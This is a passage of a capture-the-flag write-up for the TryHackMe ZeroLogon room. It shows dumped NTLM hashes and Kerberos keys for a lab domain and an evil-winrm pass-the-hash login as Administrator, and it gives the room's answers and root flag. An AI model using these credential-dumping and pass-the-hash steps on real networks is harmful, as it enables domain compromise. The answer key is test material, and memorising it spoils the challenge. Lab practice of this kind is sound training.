hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::
hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::
hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49
Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1
Administrator:des-cbc-md5:bf34685d383e6734
krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583
krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d
krbtgt:des-cbc-md5:25f1cea1542f9e31
hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763
hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab
hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1
hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd
hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350
hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1
hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04
hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5
hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe
hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb
hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53
hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80
hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287
hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba
hololive.local\koronei:des-cbc-md5:a737e6073d15aecd
hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5
hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a
hololive.local\okayun:des-cbc-md5:10896d3786b9628f
hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9
hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc
hololive.local\watamet:des-cbc-md5:bf622564a840f192
hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233
hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42
hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1
DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8
DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8
DC01$:des-cbc-md5:cd161923ab9ec11c
[*] Cleaning up...
```

`3f3ef89114fb063e3d7fc23c20f65568`

5. How many Domain Admin accounts are there?

```
a-koronei
a-fubukis
```

`2`

6. What is the root flag?

```
(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.162.183

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hololive\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/20/2020   2:02 PM             24 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
THM{Zer0Log0nD4rkTh1rty}
```

`THM{Zer0Log0nD4rkTh1rty}`
